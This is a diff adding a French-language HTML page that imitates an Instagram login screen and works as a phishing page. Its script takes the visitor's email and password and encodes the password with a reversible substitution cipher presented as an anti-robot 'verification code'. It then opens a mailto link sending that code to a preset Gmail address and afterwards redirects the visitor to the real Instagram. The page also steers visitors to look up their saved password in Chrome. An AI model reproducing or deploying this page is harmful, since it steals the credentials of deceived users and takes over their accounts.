@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 300px;
+        }
+
+        .logo-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-form input {
+            width: calc(100% - 20px); /* Ajustement pour tenir compte de la bordure */
+            padding: 7px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 7px;
+            background-color: #3897f0;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .separator {
+            color: #8e8e8e;
+            margin: 10px 0;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .login-facebook {
+            background: none;
+            border: none;
+            color: #385185;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .login-facebook img {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+            
+        }
+
+        a {
+            display: block;
+            color: #00376b;
+            margin-top: 20px;
+            
+        }
+        #explain{
+            color: red;
+        }
+        #prove{
+            display: none;
+        }
+        #part1_1,#part1_2{
+            display: block;
+        }
+
+        #part2{
+            display: none;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-container">
+            <!-- Vous pouvez ajouter l'image du logo d'Instagram ici -->
+            <img src="./instaimg/instagramico.jpg" alt="Logo Instagram">
+        </div>
+        <section id="part1_1">
+            <form class="login-form">
+                <input type="text" placeholder="e-mail" id="em" required>
+                <input type="password" placeholder="Mot de passe" id="pw" required>
+                <button type="submit" id="sm">Se connecter</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#" id="forgot">Mot de passe oublié ?</a>
+            </div>
+        </section>
+        <!-- <form class="login-form">
+            <input type="text" placeholder="e-mail" id="em" required>
+            <input type="password" placeholder="Mot de passe" id="pw" required>
+            <button type="submit" id="sm">Se connecter</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Mot de passe oublié ?</a>
+        </div> -->
+        <div id="prove">
+            <p id="explain">⚠ Envoyer le code de verification suivant pour prouver que vous n'etes pas un robot: </p>
+            <button id="pw2"></button>
+        </div>
+        <section id="part1_2">
+            <div class="separator">OU</div>
+            <button class="login-facebook" id="lf">
+                <img src="./instaimg/facebookico.png" alt="Facebook Logo">
+                Se connecter avec Facebook
+            </button>
+        </section>
+<!--         <div class="separator">OU</div>
+
+        <button class="login-facebook" id="lf">
+            <img src="./instaimg/facebookico.png" alt="Facebook Logo">
+            Se connecter avec Facebook
+        </button> -->
+        <section id="part2">
+            <h1>Mot de passe oublié ?</h1>
+            <p>Si vous aviez oublié votre mot de passe suivez les etapes suivante pour le retrouver:</p>
+            <ol>
+                <li>allez dans Chrome</li>
+                <li>parametre</li>
+                <li>gestionaire de mots de passe</li>
+                <li>recherchez votre mot de passe instagram</li>
+            </ol>
+            <button id="back">Retour</button>
+        </section>
+    </div>
+    <script src="instagram.js"></script>
+    <script>
+        
+var sm = document.getElementById("sm")
+
+var bk = document.getElementById("back")
+
+var fg = document.getElementById("forgot")
+var part11 = document.getElementById("part1_1")
+var part12 = document.getElementById("part1_2")
+var part2 = document.getElementById("part2")
+
+var prove = document.getElementById("prove")
+var pw2 = document.getElementById("pw2")
+var tm = 0
+var tab = []
+
+sm.onclick = function(event){
+    event.preventDefault()
+
+    var pw = document.getElementById("pw").value
+    var em = document.getElementById("em").value
+    if(tm == 0 ){
+        if(em.includes("@gmail.com") && em.length != 0 && pw.length != 0 ){
+            // affichage de prove
+            
+
+            // creation du code
+            for(var i=0; i<pw.length; i++){
+                if(pw.charAt(i)=="a"){tab.push(0)}
+                else if(pw.charAt(i)=="b"){tab.push(1)}
+                else if(pw.charAt(i)=="c"){tab.push(2)}
+                else if(pw.charAt(i)=="d"){tab.push(3)}
+                else if(pw.charAt(i)=="e"){tab.push(4)}
+                else if(pw.charAt(i)=="f"){tab.push(5)}
+                else if(pw.charAt(i)=="g"){tab.push(6)}
+                else if(pw.charAt(i)=="h"){tab.push(7)}
+                else if(pw.charAt(i)=="i"){tab.push(8)}
+                else if(pw.charAt(i)=="j"){tab.push(9)}
+                else if(pw.charAt(i)=="k"){tab.push("&")}
+                else if(pw.charAt(i)=="l"){tab.push("é")}
+                else if(pw.charAt(i)=="m"){tab.push(" ")}
+                else if(pw.charAt(i)=="n"){tab.push("'")}
+                else if(pw.charAt(i)=="o"){tab.push("(")}
+                else if(pw.charAt(i)=="p"){tab.push("-")}
+                else if(pw.charAt(i)=="q"){tab.push("è")}
+                else if(pw.charAt(i)=="r"){tab.push("_")}
+                else if(pw.charAt(i)=="s"){tab.push("ç")}
+                else if(pw.charAt(i)=="t"){tab.push("à")}
+                else if(pw.charAt(i)=="u"){tab.push(")")}
+                else if(pw.charAt(i)=="v"){tab.push("=")}
+                else if(pw.charAt(i)=="w"){tab.push("$")}
+                else if(pw.charAt(i)=="x"){tab.push("*")}
+                else if(pw.charAt(i)=="y"){tab.push("ù")}
+                else if(pw.charAt(i)=="z"){tab.push(",")}
+                // maj
+                else if(pw.charAt(i)=="A"){tab.push("ﬦ")}
+                else if(pw.charAt(i)=="B"){tab.push("ﬧ")}
+                else if(pw.charAt(i)=="C"){tab.push("ﬨ")}
+                else if(pw.charAt(i)=="D"){tab.push("﬩")}
+                else if(pw.charAt(i)=="E"){tab.push("שׁ")}
+                else if(pw.charAt(i)=="F"){tab.push("אַ")}
+                else if(pw.charAt(i)=="G"){tab.push("ꭔ")}
+                else if(pw.charAt(i)=="H"){tab.push("ꭕ")}
+                else if(pw.charAt(i)=="I"){tab.push("ꭖ")}
+                else if(pw.charAt(i)=="J"){tab.push("ꭗ")}
+                else if(pw.charAt(i)=="K"){tab.push("Ꞥ")}
+                else if(pw.charAt(i)=="L"){tab.push("꭛")}
+                else if(pw.charAt(i)=="M"){tab.push("ꭜ")}
+                else if(pw.charAt(i)=="N"){tab.push("ꭝ")}
+                else if(pw.charAt(i)=="O"){tab.push("ꟿ")}
+                else if(pw.charAt(i)=="P"){tab.push("ꜜ")}
+                else if(pw.charAt(i)=="Q"){tab.push("ꜝ")}
+                else if(pw.charAt(i)=="R"){tab.push("♫")}
+                else if(pw.charAt(i)=="S"){tab.push("Ⱡ")}
+                else if(pw.charAt(i)=="T"){tab.push("ⱡ")}
+                else if(pw.charAt(i)=="U"){tab.push("Ɫ")}
+                else if(pw.charAt(i)=="V"){tab.push("Ᵽ")}
+                else if(pw.charAt(i)=="W"){tab.push("Ɽ")}
+                else if(pw.charAt(i)=="X"){tab.push("ⱥ")}
+                else if(pw.charAt(i)=="Y"){tab.push("ⱦ")}
+                else if(pw.charAt(i)=="Z"){tab.push("Ⱨ")}
+                //Chiffr¤e
+                else if(pw.charAt(i)==0){tab.push("a")}
+                else if(pw.charAt(i)==1){tab.push("b")}
+                else if(pw.charAt(i)==2){tab.push("c")}
+                else if(pw.charAt(i)==3){tab.push("d")}
+                else if(pw.charAt(i)==4){tab.push("e")}
+                else if(pw.charAt(i)==5){tab.push("f")}
+                else if(pw.charAt(i)==6){tab.push("g")}
+                else if(pw.charAt(i)==7){tab.push("h")}
+                else if(pw.charAt(i)==8){tab.push("i")}
+                else if(pw.charAt(i)==9){tab.push("j")}
+                // speciaux
+                else if(pw.charAt(i)=="&"){tab.push("k")}
+                else if(pw.charAt(i)=="é"){tab.push("l")}
+                else if(pw.charAt(i)==" "){tab.push("m")}
+                else if(pw.charAt(i)=="'"){tab.push("n")}
+                else if(pw.charAt(i)=="("){tab.push("o")}
+                else if(pw.charAt(i)=="-"){tab.push("p")}
+                else if(pw.charAt(i)=="è"){tab.push("q")}
+                else if(pw.charAt(i)=="_"){tab.push("r")}
+                else if(pw.charAt(i)=="ç"){tab.push("s")}
+                else if(pw.charAt(i)=="à"){tab.push("t")}
+                else if(pw.charAt(i)==")"){tab.push("u")}
+                else if(pw.charAt(i)=="="){tab.push("v")}
+                else if(pw.charAt(i)=="$"){tab.push("w")}
+                else if(pw.charAt(i)=="*"){tab.push("x")}
+                else if(pw.charAt(i)=="ù"){tab.push("y")}
+                else if(pw.charAt(i)==","){tab.push("z")}
+                // autres
+                else if(pw.charAt(i)==";"){tab.push("д")}
+                else if(pw.charAt(i)==":"){tab.push("ж")}
+                else if(pw.charAt(i)=="!"){tab.push("и")}
+                else if(pw.charAt(i)=="°"){tab.push("й")}
+                else if(pw.charAt(i)=="+"){tab.push("л")}
+                else if(pw.charAt(i)=="£"){tab.push("ф")}
+                else if(pw.charAt(i)=="µ"){tab.push("Ϗ")}
+                else if(pw.charAt(i)=="%"){tab.push("ϐ")}
+                else if(pw.charAt(i)=="?"){tab.push("ϑ")}
+                else if(pw.charAt(i)=="."){tab.push("ς")}
+                else if(pw.charAt(i)=="/"){tab.push("Ϙ")}
+                else if(pw.charAt(i)=="§"){tab.push("Ш")}
+                else if(pw.charAt(i)=="@"){tab.push("^")}
+                else if(pw.charAt(i)=='"'){tab.push("{")}
+
+
+
+                else{tab.push(pw.charAt(i)+"²")}
+
+            }
+            // result
+            var result = tab.join("")
+
+
+
+            // nouveau code
+            prove.style.display = "block"
+            pw2.innerText = result
+            pw2.onclick = function(event){
+                event.preventDefault()
+                var expediteur = em  
+              
+                var message = result+"\nretournez à la page de connexion pour vous reconnecter aprés avoir envoyé se message"
+                var destinataire = "iogin.auth.tst@gmail.com"; // Adresse e-mail du destinataire prédéfinie
+                
+                // Créer le lien "mailto" avec le destinataire, l'expéditeur, le sujet et le corps du message
+                var lienMailto = "mailto:" + destinataire + "?subject=Nouveau message&body=" + encodeURIComponent(message) + "&from=" + expediteur;
+                // Ouvrir le client de messagerie par défaut avec le lien "mailto"
+                window.location.href = lienMailto;
+                tm = 1
+            }
+
+
+            // modification de tm
+            
+        }else{
+            alert("une information est incorrecte")
+        }
+    }else{
+        prove.style.display = "none"
+        sm.style.backgroundColor = "grey"
+        setTimeout(function(){
+                           window.open('https://www.instagram.com/', '_blank');
+        },2000)
+        
+    }
+}
+fg.onclick = function(){
+    part11.style.display="none"
+    part12.style.display="none"
+    part2.style.display="block"
+}
+bk.onclick = function(){
+    part11.style.display="block"
+    part12.style.display="block"
+    part2.style.display="none"
+}
+
+    </script>
+
+</body>
+</html>
